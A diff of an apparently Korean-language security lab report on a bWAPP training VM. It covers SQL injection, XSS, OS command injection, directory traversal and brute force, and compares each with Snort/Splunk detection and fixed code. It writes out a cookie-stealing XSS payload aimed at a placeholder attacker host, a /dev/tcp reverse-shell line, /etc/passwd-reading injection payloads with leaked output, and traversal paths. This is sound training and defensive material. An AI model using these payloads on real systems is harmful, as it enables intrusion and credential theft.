@@ -205,7 +205,90 @@ ET WEB_SERVER WEB-PHP phpinfo access
 
 ## 웹 공격 단계 (Exploitation)
 
+> **정찰에서 공격으로** — R-1~R-4에서 확인한 사실: 80/tcp만 열림, Apache 2.2.8 / PHP 5.2.4(EOL), bWAPP 동작 중, Drupal·phpMyAdmin·WebDAV 노출.
+> 이 정보를 바탕으로 실제 취약점을 악용(exploit)하여 **데이터 탈취·세션 장악·시스템 명령 실행**을 시도한다.
+
+### 웹 공격의 분류 — 7가지 공격의 전체 그림
+
+| 분류 | 공격 | 조작 대상 | 최종 영향 | 위험도 | OWASP 2021 | CWE |
+|------|------|-----------|-----------|--------|------------|-----|
+| **서버측 주입** | E-1/E-2 SQLi | SQL 쿼리 | DB 전체 유출·변조 | Critical | A03 Injection | CWE-89 |
+| | E-5 Command Injection | OS 셸 명령 | 서버 시스템 장악 | Critical | A03 Injection | CWE-78 |
+| **클라이언트측 주입** | E-3 Reflected XSS | HTML/JS 응답 | 특정 피해자 세션 탈취 | High | A03 Injection | CWE-79 |
+| | E-4 Stored XSS | 저장된 HTML/JS | 모든 방문자 세션 탈취 | Critical | A03 Injection | CWE-79 |
+| **접근 제어 우회** | E-6 Directory Traversal | 파일 경로 | 시스템 파일 노출 | High | A01 Broken Access Control | CWE-22 |
+| **인증 공격** | E-7 Brute Force | 로그인 자격증명 | 계정 탈취 | High | A07 Auth Failures | CWE-307 |
+
+### 공격 간 연계도 — 왜 이 순서인가
+
+```
+정찰(R-1~R-4) — 열린 포트·버전·경로 파악 완료
+    │
+    ├→ E-1/E-2 SQLi ── DB에서 계정·해시 탈취 → 인증 정보 확보
+    │       └→ sqlmap 자동화로 전체 DB 덤프 + 해시 크랙
+    ├→ E-3 Reflected XSS ── 피해자 클릭 유도 → 세션 쿠키 탈취
+    ├→ E-4 Stored XSS ──── 게시글에 저장 → 모든 방문자 쿠키 자동 탈취
+    │       └→ IPS 미탐지 발견 (POST body 경유 → Snort URI 검사 우회)
+    ├→ E-5 Command Injection ── 서버 OS 명령 실행 → 시스템 장악
+    │       └→ 리버스쉘 → 권한상승 → 내부망 침투 (실무 킬체인)
+    ├→ E-6 Directory Traversal ── 시스템 파일 열람 → 추가 정보 수집
+    └→ E-7 Brute Force ── 사전 대입으로 계정 탈취 → 정상 사용자 위장
+```
+
+> **IPS 탐지 패턴 핵심 발견 (실습에서 도출한 인사이트):**
+> - **GET 파라미터(URI)** 경유 공격 → Snort 탐지 **잘 됨** (E-1 SQLi, E-3 Reflected XSS)
+> - **POST body** 경유 공격 → 요청측 탐지 **못 함** (E-4 Stored XSS, E-5 Command Injection)
+> - **응답(Response)** 에 민감정보 포함 → 일부 응답측 룰로 포착 (E-5 `/etc/passwd` 응답)
+> → **네트워크 IPS의 구조적 한계** = Phase 2 보고서의 핵심 논점
+
+---
+
 ### E-1. SQL Injection (수동)
+
+#### 개념 상세 — SQL Injection이란
+
+**SQL Injection(SQLi)** 은 웹 애플리케이션이 사용자 입력을 SQL 쿼리 문자열에 직접 이어붙일(concatenation) 때 발생한다. 공격자가 SQL 구문을 삽입하면 **쿼리의 논리 구조 자체가 변조**되어, 개발자가 의도하지 않은 동작이 실행된다.
+
+**취약한 코드 vs 안전한 코드:**
+
+```php
+// ❌ 취약한 코드 (bWAPP sqli_1.php의 구조)
+$sql = "SELECT * FROM movies WHERE title LIKE '%" . $_GET['title'] . "%'";
+
+// 사용자가 iron 입력 → 정상 동작:
+//   SELECT * FROM movies WHERE title LIKE '%iron%'
+
+// 공격자가 ' OR '1'='1 입력 → SQL 구조 변조:
+//   SELECT * FROM movies WHERE title LIKE '%' OR '1'='1%'
+//   → WHERE 조건이 항상 참 → 테이블 전체 데이터 반환
+
+// ✅ 안전한 코드 (Prepared Statement / 파라미터 바인딩)
+$stmt = $pdo->prepare("SELECT * FROM movies WHERE title LIKE ?");
+$stmt->execute(['%' . $_GET['title'] . '%']);
+// → 입력값이 "데이터"로만 취급됨, SQL 구문으로 해석 불가
+```
+
+**SQLi의 단계적 위험 확대:**
+
+| 단계 | 기법 | 영향 | 이번 실습 |
+|------|------|------|-----------|
+| 1단계 | 인증 우회 (`' OR '1'='1`) | 로그인 없이 접근 | ✅ 전체 목록 반환 |
+| 2단계 | 데이터 추출 (`UNION SELECT`) | 다른 테이블의 민감 데이터 탈취 | ✅ users 테이블 해시 유출 |
+| 3단계 | 권한 상승 | DB 관리자 권한 획득, 데이터 변조·삭제 | — (미실습) |
+| 4단계 | OS 명령 실행 (`INTO OUTFILE`, `xp_cmdshell`) | 서버 장악 (SQLi만으로 RCE 달성) | — (미실습) |
+
+**SQLi 유형 분류:**
+
+| 유형 | 방법 | 특징 | 이번 실습 |
+|------|------|------|-----------|
+| **In-band (Classic)** | 쿼리 결과가 화면에 직접 표시 | 가장 직관적, 빠른 추출 | ✅ UNION SELECT |
+| **Error-based** | DB 에러 메시지에서 정보 추출 | 에러 숨김 시 불가 | ✅ SQL 에러 노출 확인 |
+| **Blind (Boolean)** | 참/거짓에 따른 응답 차이로 한 비트씩 추론 | 느리지만 에러 없이도 가능 | sqlmap이 자동 사용 |
+| **Blind (Time)** | `SLEEP(5)` 등 응답 시간 차이로 추론 | 가장 느리지만 확실 | sqlmap이 자동 사용 |
+| **Out-of-band** | DNS/HTTP 등 외부 채널로 데이터 유출 | 방화벽 우회 가능 | — (미실습) |
+
+> **CWE-89: Improper Neutralization of Special Elements used in an SQL Command**
+> OWASP 2021 A03 Injection — 2017년까지 OWASP Top 10에서 **10년간 1위**를 차지했고, 2021년에도 3위를 유지하는 가장 대표적인 웹 취약점이다. 단순 데이터 유출에서 서버 장악까지 확대 가능하여 위험도 **Critical**로 분류된다.
 
 **bWAPP 메뉴:** SQL Injection (GET/Search)
 
@@ -246,6 +329,20 @@ ET WEB_SERVER SQL Errors in HTTP 200 Response (error in your SQL syntax)  [P2]  
 ![E-1 Snort SQLi 탐지 (Splunk)](images/E-1-snort-splunk.png)
 
 ### E-2. SQL Injection (sqlmap 자동화)
+
+#### 수동(E-1) vs 자동화(E-2) — 왜 둘 다 하는가
+
+| 항목 | E-1 수동 | E-2 sqlmap 자동화 |
+|------|---------|------------------|
+| **목적** | 취약점 원리 이해·증명 | 전체 DB 체계적 덤프 |
+| **장점** | 정밀 제어, 원리 학습 | 속도, 완전성, 해시 자동 크랙 |
+| **Snort 탐지** | 4건 (소량, 은밀) | 211건 (대량, 명백) |
+| **실제 공격자** | 먼저 구조를 파악 | 파악 후 자동화로 전환 |
+| **관제 관점** | 정상 트래픽에 묻힐 수 있음 | 도구 시그니처 + 트래픽 폭증 → 즉시 탐지 |
+
+> **sqlmap의 동작 원리:** sqlmap은 단순 반복 도구가 아니다. 대상 파라미터에 다양한 SQLi 페이로드(boolean, error, time, UNION, stacked queries)를 자동으로 시도하여 주입 가능 여부를 판별한 뒤, DBMS 종류를 식별하고, DB→테이블→컬럼→데이터 순서로 체계적으로 추출한다. 해시가 발견되면 내장 사전으로 자동 크랙까지 수행한다.
+>
+> **관제 시사점:** 수동 SQLi(E-1)는 정상 검색 요청과 구별이 어려워 **오탐/정탐 판단**이 중요하고, sqlmap(E-2)은 `User-Agent: sqlmap/1.x`와 트래픽 폭증만으로 **자동 차단 근거**가 명확하다. 실제 공격자는 수동으로 구조를 파악한 뒤 자동화 도구로 전환하는 패턴이 일반적이다.
 
 ```bash
 # DB 목록 추출
@@ -295,6 +392,50 @@ ET WEB_SERVER Possible Attempt to Get SQL Server Version (SELECT VERSION)
 
 ### E-3. Reflected XSS
 
+#### 개념 상세 — XSS(Cross-Site Scripting)란
+
+**XSS**는 웹 페이지에 악성 스크립트를 주입하여 **피해자의 브라우저에서 실행**시키는 공격이다. SQL Injection이 서버(DB)를 공격한다면, XSS는 **클라이언트(브라우저)를 공격**한다.
+
+**왜 위험한가 — 브라우저의 신뢰 모델:**
+
+브라우저는 **동일 출처 정책(Same-Origin Policy)** 에 따라 특정 도메인에서 온 스크립트를 해당 도메인의 정당한 코드로 신뢰한다. XSS로 주입된 악성 스크립트는 **정상 스크립트와 동일한 권한**을 가지므로:
+- `document.cookie`로 세션 쿠키(PHPSESSID) 읽기 → **세션 하이재킹** (공격자가 피해자로 로그인)
+- DOM 조작으로 로그인 폼을 변조 → **자격증명 피싱** (ID/PW를 공격자 서버로 전송)
+- AJAX 요청으로 피해자 권한의 작업 수행 → **CSRF와 유사한 효과** (비밀번호 변경, 게시글 작성 등)
+- 키로거 삽입 → 피해자의 **모든 입력 감시** (개인정보·카드번호 탈취)
+
+**Reflected(반사형) XSS의 동작 원리:**
+
+```
+① 공격자: 악성 링크 제작
+   http://target.com/search?q=<script>document.location='http://공격자/steal?c='+document.cookie</script>
+
+② 공격자 → 피해자에게 링크 전달 (이메일, SNS, 게시판)
+   "검색 결과를 확인하세요" (사회공학)
+
+③ 피해자가 링크 클릭 → 서버가 입력값을 그대로 응답에 포함
+   <html>검색 결과: <script>document.location=...</script></html>
+
+④ 피해자 브라우저에서 스크립트 실행 → 쿠키가 공격자 서버로 전송
+
+⑤ 공격자: 탈취한 세션 ID로 피해자 계정에 접근 (세션 하이재킹)
+```
+
+**Reflected vs Stored XSS 비교:**
+
+| 구분 | Reflected (E-3) | Stored (E-4) |
+|------|----------------|--------------|
+| 지속성 | **1회성** — 링크 클릭 시만 실행 | **영구적** — DB에 저장, 매번 실행 |
+| 피해 범위 | 링크를 클릭한 **특정 사용자** | 페이지를 방문하는 **모든 사용자** |
+| 공격 조건 | 피해자를 링크로 **유도**해야 함 (사회공학) | 한 번 저장하면 **자동** 실행 |
+| 전달 경로 | GET 파라미터 **(URI에 노출)** | POST body → DB → 응답 body |
+| IPS 탐지 | ✅ URI 검사 룰로 탐지 가능 | ❌ POST/응답 body는 미탐지 |
+| 위험도 | High | **Critical** (다수 피해 + 탐지 회피) |
+
+> **CWE-79: Improper Neutralization of Input During Web Page Generation**
+> OWASP 2021 A03 Injection에 포함. OWASP에 따르면 전체 웹 애플리케이션의 약 2/3가 XSS에 취약하며, 가장 흔한 웹 취약점 중 하나다.
+> 핵심 방어: **출력 인코딩(htmlspecialchars 등 컨텍스트별 이스케이프)**, CSP(Content Security Policy) 헤더, 쿠키 HttpOnly 플래그.
+
 **bWAPP 메뉴:** XSS - Reflected (GET)
 
 ```html
@@ -332,6 +473,43 @@ ET WEB_SERVER Script tag in URI Possible Cross Site Scripting Attempt
 
 ### E-4. Stored XSS
 
+#### 개념 상세 — Stored XSS의 위험성
+
+**Stored(저장형) XSS**는 악성 스크립트가 **서버 DB에 저장**되어, 해당 페이지를 여는 **모든 사용자**에게 자동으로 실행되는 XSS의 가장 위험한 형태다.
+
+**Reflected와의 핵심 차이:**
+- Reflected: 공격자가 **매번 피해자를 악성 링크로 유도**해야 함 (사회공학에 의존)
+- Stored: **한 번 저장하면 이후 방문자 전원이 자동 감염** (유도 불필요, 대규모 피해)
+
+**Stored XSS 공격 흐름:**
+
+```
+① 공격자: Blog 게시글에 악성 스크립트 작성 후 Submit (POST 요청)
+   <script>document.location='http://공격자서버/steal?c='+document.cookie</script>
+                    ↓
+② 서버: 입력 검증 없이 DB에 스크립트 그대로 저장
+                    ↓
+③ 일반 사용자 A가 Blog 페이지 방문
+                    ↓
+④ 서버: DB에서 게시글 조회 → 스크립트 포함된 HTML 응답 전송
+                    ↓
+⑤ 사용자 A의 브라우저: 스크립트 자동 실행 → 쿠키가 공격자 서버로 전송
+                    ↓
+⑥ 사용자 B, C, D... 도 방문할 때마다 같은 피해 반복
+```
+
+**실제 사례 — Samy Worm (2005, MySpace):**
+Stored XSS가 **자기 복제 웜(worm)** 으로 발전한 대표 사례. MySpace 프로필에 저장된 XSS 코드가 프로필 방문자에게 자동 전파되어, 20시간 만에 **100만 명 이상이 감염**되었다. 방문만으로 자동 전파되는 특성 때문에 기하급수적으로 확산했으며, MySpace는 서비스를 일시 중단해야 했다.
+
+**이번 실습의 핵심 발견 — IPS 탐지 한계:**
+
+| 공격 | 페이로드 경로 | Snort 검사 범위 | 탐지 결과 |
+|------|-------------|----------------|----------|
+| E-3 Reflected XSS | GET 파라미터 → **URI** → 응답 | URI 검사 ✅ | **탐지 성공** (3건) |
+| E-4 Stored XSS | **POST body** → DB → **응답 body** | URI만 검사 | **미탐지** ❌ |
+
+→ Snort의 `Script tag in URI` 룰은 URI(URL)만 검사하므로, POST body로 전송되는 Stored XSS 페이로드를 탐지할 수 없다. 이는 네트워크 IPS의 **구조적 한계**이며, WAF(Web Application Firewall)나 **애플리케이션 레벨 방어**(출력 인코딩, CSP)가 필수적임을 보여준다.
+
 **bWAPP 메뉴:** XSS - Stored (Blog)
 
 ```html
@@ -368,9 +546,57 @@ ET WEB_SERVER Script tag in URI Possible Cross Site Scripting Attempt
 
 **bWAPP 메뉴:** OS Command Injection (`commandi.php`)
 
-> **원리:** 웹앱이 사용자 입력을 `shell_exec("nslookup " . $input)` 처럼 OS 명령에 직접 연결할 때,
-> 셸 메타문자(`;`, `|`, `&&`)를 삽입하면 임의 명령을 실행할 수 있다.
-> SQL Injection이 DB를 장악한다면, Command Injection은 **서버 자체를 장악**하는 공격이다.
+#### 개념 상세 — OS Command Injection이란
+
+**Command Injection**은 웹 애플리케이션이 사용자 입력을 **OS 셸 명령의 일부로 실행**할 때 발생한다. SQL Injection이 DB를 장악한다면, Command Injection은 **서버 운영체제 자체를 장악**하는 공격으로, 웹 취약점 중 가장 위험한 부류에 속한다.
+
+**취약한 코드의 원리:**
+
+```php
+// ❌ 취약한 코드 (bWAPP commandi.php의 구조)
+$target = $_POST['target'];
+$output = shell_exec("nslookup " . $target);
+
+// 정상 입력: 127.0.0.1
+//   실행: nslookup 127.0.0.1  ← DNS 조회만 수행
+
+// 공격 입력: 127.0.0.1; whoami
+//   실행: nslookup 127.0.0.1; whoami  ← 세미콜론이 명령을 분리
+//   → nslookup 결과 + "www-data" 출력 = 임의 명령 실행 성공
+
+// ✅ 안전한 코드
+$output = gethostbyname($target);  // OS 명령 대신 PHP 내장 함수 사용
+// 또는
+$output = shell_exec("nslookup " . escapeshellarg($target));  // 셸 메타문자 이스케이프
+```
+
+**셸 메타문자의 종류와 의미:**
+
+| 메타문자 | 의미 | 예시 |
+|---------|------|------|
+| `;` | 명령 구분 (앞 명령 성공/실패 무관) | `127.0.0.1; whoami` |
+| `\|` | 파이프 (앞 명령의 출력을 뒤 명령의 입력으로) | `127.0.0.1 \| cat /etc/passwd` |
+| `&&` | AND (앞 명령 성공 시에만 뒤 명령 실행) | `127.0.0.1 && id` |
+| `\|\|` | OR (앞 명령 실패 시에만 뒤 명령 실행) | `invalid \|\| whoami` |
+| `` ` `` | 백틱 (명령 치환) | `` 127.0.0.1 `whoami` `` |
+| `$()` | 명령 치환 (POSIX) | `127.0.0.1 $(whoami)` |
+
+**Command Injection이 특히 위험한 이유 — 공격 확대 경로:**
+
+```
+① whoami → www-data (웹서버 권한 확인)
+② cat /etc/passwd → 시스템 계정 목록 확인
+③ uname -a → 커널 버전 확인 → 커널 익스플로잇 검색
+④ 리버스쉘 획득: bash -i >& /dev/tcp/공격자IP/4444 0>&1
+⑤ 권한상승(Privilege Escalation): 커널 취약점 또는 SUID 바이너리 악용
+⑥ 내부망 침투(Lateral Movement): 내부 네트워크 스캔 → 추가 시스템 장악
+```
+
+→ **단 한 줄의 명령 주입**이 서버 완전 장악 → 내부망 침투까지 이어질 수 있어, 위험도는 **Critical**이다.
+이것이 Phase 2에서 **DMZ 아웃바운드 차단**(리버스쉘 방지)을 방화벽 정책에 포함하는 이유다.
+
+> **CWE-78: Improper Neutralization of Special Elements used in an OS Command**
+> OWASP 2021 A03 Injection. SQL Injection(CWE-89)과 함께 Injection 카테고리의 대표 취약점이다.
 
 **사전 준비:**
 - ✅ Bee-box DNS 설정 완료 (`echo "nameserver 10.0.10.1" | sudo tee /etc/resolv.conf`)
@@ -404,31 +630,118 @@ ET WEB_SERVER Script tag in URI Possible Cross Site Scripting Attempt
 
 3. 만약 `;`이 안 먹히면 다른 구분자 시도: `127.0.0.1 | whoami` 또는 `127.0.0.1 && whoami`
 
-**확인 포인트:**
-- [ ] `whoami` → `www-data` 출력 = 웹서버 권한으로 OS 명령 실행 성공
-- [ ] `cat /etc/passwd` → 계정 목록 노출 = 민감 파일 접근 가능
-- [ ] 캡처: 명령 주입 결과 화면 → `images/E-5-cmdi.png`
+**결과:** ✅ (2026-08-10 17:23 KST)
 
-**Snort 탐지 확인:**
-- Splunk: `index=pfsense 10.50.50.17` (Last 15 minutes)
-- 예상 시그니처: `ET WEB_SERVER cmd=`, `ET WEB_SERVER /etc/passwd`
-- ⚠️ E-4(Stored XSS)처럼 POST body 경유 시 미탐지 가능성 있음 — 이것도 중요한 발견
-- 캡처: Splunk 결과 → `images/E-5-snort-splunk.png`
+**공격 페이로드 & 결과:**
+- `127.0.0.1; whoami` → nslookup 결과 + **`www-data`** 출력 = 웹서버 권한으로 OS 명령 실행 성공
+- `127.0.0.1; cat /etc/passwd` → 시스템 계정 목록 **전체 노출**:
+  ```
+  root:x:0:0:root:/root:/bin/bash
+  www-data:x:33:33:www-data:/var/www:/bin/sh
+  bee:x:1000:1000:bee,,,:/home/bee:/bin/bash
+  mysql:x:104:113:MySQL Server,,,:/var/lib/mysql:/bin/false
+  neo:x:1001:1001:,,,:/home/neo:/bin/bash
+  alice:x:1002:1002:,,,:/home/alice:/bin/bash
+  thor:x:1003:1003:,,,:/home/thor:/bin/bash
+  wolverine:x:1004:1004:,,,:/home/wolverine:/bin/bash
+  ...
+  ```
+  → www-data 권한으로 시스템 전체 계정 정보 접근 가능 확인
+
+**Snort 탐지: ⚠️ 응답측만 탐지 (1건, 중요 발견)**
+
+Splunk `index=pfsense 10.50.50.17` 검색 결과:
+```
+ET ATTACK_RESPONSE Possible /etc/passwd via HTTP (linux style)
+[Classification: Potentially Bad Traffic] [Priority: 2]
+[TCP] 10.0.0.254:80 -> 10.50.50.17:41158
+```
+- **요청(Request) 방향** — 탐지 **❌**: 공격 페이로드(`; cat /etc/passwd`)는 **POST body**로 전송됨. Snort URI 검사 룰은 POST body를 검사하지 않으므로 요청 시점 탐지 실패
+- **응답(Response) 방향** — 탐지 **✅**: 서버 응답 body에 `/etc/passwd` 내용이 포함되어 `ET ATTACK_RESPONSE` 룰이 탐지 (방향: 서버 → 공격자)
+- **E-3/E-4/E-5 탐지 패턴 비교 — 네트워크 IPS 한계 종합:**
+
+| 공격 | 요청 경로 | 요청 탐지 | 응답 탐지 | 총 탐지 |
+|------|----------|----------|----------|--------|
+| E-3 Reflected XSS | GET (URI) | ✅ `Script tag in URI` | — | 3건 |
+| E-4 Stored XSS | POST body | ❌ | ❌ | **0건** |
+| E-5 Command Injection | POST body | ❌ | ✅ `ATTACK_RESPONSE passwd` | **1건** |
+
+→ Snort는 **URI(GET 파라미터)만 잘 검사**하고, **POST body는 검사하지 못한다**. 다만 응답에 `/etc/passwd` 같은 **민감 정보 패턴**이 있으면 응답측 룰로 탐지 가능. E-4는 응답에도 탐지 가능한 패턴이 없어 완전히 놓침.
 
 **관제/컨설팅 관점:**
 - 위험도: **Critical** — 서버 OS 명령 실행 = 시스템 완전 장악 가능 (리버스쉘, 파일 조작, 권한상승)
 - 방어: 입력값에서 셸 메타문자 제거, `escapeshellarg()` 사용, OS 명령 대신 언어 내장 함수(PHP `gethostbyname()`) 사용
-- 관제 포인트: `/etc/passwd`, `cmd=`, `whoami` 등 OS 명령 키워드가 HTTP 트래픽에 나타나면 즉시 차단
+- 관제 포인트: `ATTACK_RESPONSE` 시그니처는 **공격 성공 후** 탐지이므로, 이미 데이터가 유출된 상태. **사후 탐지**의 한계 → 사전 방어(입력 검증, WAF)가 필수
+
+**스크린샷:**
+
+![E-5 whoami 명령 주입 성공](images/E-5-cmdi-whoami.png)
+![E-5 /etc/passwd 유출](images/E-5-cmdi-passwd.png)
+![E-5 Snort ATTACK_RESPONSE 탐지 (Splunk)](images/E-5-snort-splunk.png)
 
 ---
 
 ### E-6. Directory Traversal
 
-**bWAPP 메뉴:** Directory Traversal - Files (`directory_traversal_1.php`)
+#### 개념 상세 — Directory Traversal(경로 조작)이란
 
-> **원리:** 웹앱이 파일 경로를 사용자 입력으로 받을 때, `../`(상위 디렉토리 이동)를 반복 삽입하면
-> 웹루트 밖의 시스템 파일을 읽을 수 있다. R-3(nikto)에서 이미 traversal 흔적이 탐지되었고,
-> 여기서는 **수동으로 실제 파일 열람**을 확인한다.
+**Directory Traversal**(Path Traversal이라고도 함)은 웹 애플리케이션이 파일 경로를 사용자 입력으로 받을 때, `../`(상위 디렉토리 이동)를 반복 삽입하여 **웹루트(DocumentRoot) 밖의 시스템 파일에 접근**하는 취약점이다.
+
+**취약한 코드의 원리:**
+
+```php
+// ❌ 취약한 코드 (bWAPP directory_traversal_1.php의 구조)
+$file = $_GET['page'];
+include("languages/" . $file);
+
+// 정상 요청: ?page=en.php
+//   포함: languages/en.php  ← 웹루트 내 정상 파일
+
+// 공격 요청: ?page=../../../etc/passwd
+//   포함: languages/../../../etc/passwd
+//   → 경로 해석: /etc/passwd  ← 웹루트 밖의 시스템 파일 접근!
+
+// ✅ 안전한 코드
+$file = basename($_GET['page']);  // 경로 구분자 제거, 파일명만 추출
+$allowed = ['en.php', 'ko.php', 'de.php'];  // 화이트리스트
+if (in_array($file, $allowed)) { include("languages/" . $file); }
+```
+
+**`../`의 동작 원리 — 파일 시스템 경로 해석:**
+
+```
+웹루트: /var/www/bWAPP/languages/
+         ↓ ../     → /var/www/bWAPP/
+         ↓ ../../  → /var/www/
+         ↓ ../../../ → /var/
+         ↓ ../../../../ → /
+         ↓ ../../../../etc/passwd → /etc/passwd (시스템 계정 파일)
+```
+
+**유출 가능한 민감 파일들:**
+
+| 파일 | 내용 | 위험도 |
+|------|------|--------|
+| `/etc/passwd` | 시스템 계정 목록 (사용자명, UID, 홈 디렉토리, 셸) | High |
+| `/etc/shadow` | 비밀번호 해시 (www-data 권한으로는 보통 접근 불가) | Critical |
+| `/var/www/bWAPP/config/db.php` | DB 접속 정보 (호스트, 사용자, 비밀번호) | Critical |
+| `/etc/apache2/apache2.conf` | 웹서버 설정 (가상호스트, 모듈, 경로) | Medium |
+| `~/.bash_history` | 명령어 이력 (관리자 작업 내역 노출) | High |
+
+**Directory Traversal vs 관련 공격:**
+
+| 공격 | 핵심 | 차이점 |
+|------|------|--------|
+| Directory Traversal (E-6) | `../` 경로 조작으로 **파일 읽기** | 파일 읽기만 가능 |
+| LFI (Local File Inclusion) | 경로 조작 + **파일을 코드로 실행** | PHP include 시 코드 실행까지 |
+| RFI (Remote File Inclusion) | 원격 URL의 파일을 **서버에서 실행** | 외부 악성 코드 로딩 |
+| E-5 Command Injection | OS 명령 실행으로 **파일 읽기 + α** | 명령 실행 = 더 넓은 범위 |
+
+> R-3(nikto)에서 이미 traversal 흔적이 Snort에 탐지되었다. 여기서는 **수동으로 실제 파일 열람 성공 여부**를 확인한다.
+> **CWE-22: Improper Limitation of a Pathname to a Restricted Directory**
+> OWASP 2021 A01 Broken Access Control — 2021년 OWASP Top 10에서 **1위**로 올라선 카테고리.
+
+**bWAPP 메뉴:** Directory Traversal - Files (`directory_traversal_1.php`)
 
 **실습 절차:**
 
@@ -476,11 +789,46 @@ http://10.0.0.254/bWAPP/directory_traversal_1.php?page=../../../etc/passwd
 
 ### E-7. Brute Force (hydra)
 
-**bWAPP 메뉴:** 직접 사용하지 않음 — bWAPP 로그인 페이지(`login.php`)를 대상으로 hydra 실행
+#### 개념 상세 — Brute Force(무차별 대입) 공격이란
 
-> **원리:** 로그인 폼에 사전(wordlist)의 비밀번호를 자동으로 대입하여 계정을 탈취한다.
-> E-2(sqlmap)에서 이미 해시를 크랙했지만, 브루트포스는 **해시 없이도 계정을 탈취**할 수 있고,
-> 관제 관점에서 반복 로그인 시도 탐지가 중요한 시나리오다.
+**Brute Force**는 로그인 폼에 다수의 자격증명(ID/PW 조합)을 **자동으로 대입**하여 유효한 계정을 찾는 공격이다. 기술적 취약점이 아닌 **약한 비밀번호·인증 정책의 부재**를 노리는 공격으로, 가장 단순하지만 여전히 효과적이다.
+
+**인증 공격의 분류:**
+
+| 공격 유형 | 방법 | 특징 | 소요 시간 |
+|----------|------|------|-----------|
+| **Brute Force (전수 조사)** | 모든 가능한 조합 시도 (aaa, aab, aac...) | 확실하지만 매우 느림 | 수일~수년 |
+| **Dictionary Attack (사전 공격)** | 자주 쓰이는 비밀번호 목록 대입 | 현실적 속도, 약한 PW에 효과적 | 수분~수시간 |
+| **Credential Stuffing** | 유출된 ID/PW 목록을 다른 사이트에 대입 | 비밀번호 재사용 노림 | 수분 |
+| **Password Spraying** | 소수 PW를 다수 계정에 대입 | 계정 잠금 우회 | 수시간~수일 |
+
+> 이번 실습은 **Dictionary Attack** — 자주 쓰이는 비밀번호 사전(wordlist)을 bWAPP 로그인에 대입한다.
+
+**이번 실습에서의 의미 — 왜 E-2 이후에도 하는가:**
+- E-2(sqlmap)에서 이미 DB 해시를 크랙하여 비밀번호(`bug`)를 알아냈지만,
+- Brute Force는 **DB 접근 없이도 계정을 탈취**할 수 있고,
+- 관제 관점에서 **반복 로그인 시도 탐지**와 **계정 잠금 정책 부재** 확인이 핵심 시나리오다.
+
+**Brute Force 방어의 핵심 계층:**
+
+```
+1차: 강한 비밀번호 정책 (길이 8+, 복잡성, 사전 단어 금지)
+         ↓ 뚫리면
+2차: 계정 잠금 (N회 실패 시 일정 시간 잠금)
+         ↓ 뚫리면
+3차: CAPTCHA / MFA (자동화 도구 차단)
+         ↓ 뚫리면
+4차: IP 기반 차단 (fail2ban, Snort Block Offenders)
+         ↓ 뚫리면
+5차: 관제 탐지 → 수동 대응 (Splunk 알림 → SOC 분석)
+```
+
+→ bWAPP(Security Level: low)은 위 방어가 **전부 없는** 상태이므로, 10개 사전으로도 수초 내 크랙 가능.
+
+> **CWE-307: Improper Restriction of Excessive Authentication Attempts**
+> OWASP 2021 A07 Identification and Authentication Failures — 인증 시스템의 취약점. 비밀번호 정책, 다중 인증, 시도 제한이 없으면 자동화 공격에 무방비 상태가 된다.
+
+**bWAPP 메뉴:** 직접 사용하지 않음 — bWAPP 로그인 페이지(`login.php`)를 대상으로 hydra 실행
 
 **실습 절차:**
 
@@ -593,7 +941,7 @@ hydra -l bee -P wordlist.txt 10.0.0.254 \
 | E-2 | SQL Injection (sqlmap) | 09:37 | 2026-08-04 | 10.50.50.17 | 10.0.0.254 | ☑ | ☑ 211건 |
 | E-3 | Reflected XSS | 10:03 | 2026-08-04 | 10.50.50.17 | 10.0.0.254 | ☑ | ☑ 3건 |
 | E-4 | Stored XSS | 10:08 | 2026-08-04 | 10.50.50.17 | 10.0.0.254 | ☑ | ✘ 미탐지 |
-| E-5 | OS Command Injection | | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |
+| E-5 | OS Command Injection | 17:23 | 2026-08-10 | 10.50.50.17 | 10.0.0.254 | ☑ | ☑ 1건 (응답측) |
 | E-6 | Directory Traversal | | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |
 | E-7 | Brute Force (hydra) | | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |
 
